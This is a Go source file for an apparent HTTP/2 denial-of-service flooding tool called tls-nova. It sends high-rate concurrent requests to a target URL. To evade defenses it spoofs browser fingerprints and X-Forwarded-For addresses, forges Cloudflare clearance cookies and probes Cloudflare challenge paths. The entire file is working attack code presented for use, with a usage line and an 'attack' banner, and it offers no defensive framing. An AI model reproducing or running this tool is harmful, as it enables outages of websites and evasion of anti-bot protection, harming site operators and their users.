// tls-nova.go - HTTP/2 + TLSv1.3 + multiplex + fake fingerprint
package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
}

var methods = []string{"GET", "HEAD", "OPTIONS"}

var referers = []string{
	"https://www.google.com/",
	"https://www.google.com/search?q=",
	"https://www.youtube.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://t.co/",
	"https://news.google.com/",
	"https://www.reddit.com/",
}

var bypassPaths = []string{
	"/", "/index", "/home",
	"/cdn-cgi/l/chk_jschl",
	"/cdn-cgi/challenge-platform/h/b/orchestrate/jsch/v1",
	"/__cf_chl_rt_tk=",
	"/abc", "/x1/y2",
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func buildRequest(target, method, ua string) (*http.Request, error) {
	path := bypassPaths[rand.Intn(len(bypassPaths))]
	if strings.Contains(path, "=") || strings.HasPrefix(path, "/__cf") || strings.HasPrefix(path, "/cdn") {
		path += randStr(20)
	} else {
		path += "?" + randStr(5) + "=" + randStr(8)
	}
	fullURL := target + path

	req, err := http.NewRequest(method, fullURL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", ua)
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+randStr(6))
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	ip := randIP()
	req.Header.Set("X-Forwarded-For", ip)
	req.Header.Set("X-Real-IP", ip)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("X-Fake-Header", randStr(16))
	req.Header.Set("Cookie", fmt.Sprintf("__cf_bm=%s; cf_clearance=%s", randStr(32), randStr(64)))
	return req, nil
}

func attack(target string, duration time.Duration, rps int, wg *sync.WaitGroup) {
	defer wg.Done()

	parsed, err := url.Parse(target)
	if err != nil {
		fmt.Println("Invalid URL:", target)
		return
	}
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         parsed.Hostname(),
		MinVersion:         tls.VersionTLS13,
		MaxVersion:         tls.VersionTLS13,
		NextProtos:         []string{"h2"},
	}

	transport := &http2.Transport{
		TLSClientConfig:     tlsConf,
		DisableCompression:  false,
		AllowHTTP:           false,
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			return tls.Dial("tcp", addr, cfg)
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	end := time.Now().Add(duration)
	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()

	for time.Now().Before(end) {
		<-ticker.C
		go func() {
			ua := userAgents[rand.Intn(len(userAgents))]
			method := methods[rand.Intn(len(methods))]
			req, err := buildRequest(target, method, ua)
			if err != nil {
				return
			}
			resp, err := client.Do(req)
			if err == nil && resp != nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}()
	}
}

func atoi(s string) int {
	var n int
	fmt.Sscanf(s, "%d", &n)
	return n
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Usage: ./tls-nova https://target.com duration(seconds) threads rps")
		return
	}
	target := os.Args[1]
	seconds := atoi(os.Args[2])
	duration := time.Duration(seconds) * time.Second
	threads := atoi(os.Args[3])
	rps := atoi(os.Args[4])
	if seconds <= 0 || threads <= 0 || rps <= 0 {
		fmt.Println("Error: duration, threads, and rps must be > 0")
		return
	}
	fmt.Printf("[+] Starting attack on %s for %d seconds with %d threads, %d rps each\n", target, seconds, threads, rps)
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(target, duration, rps, &wg)
	}
	wg.Wait()
}
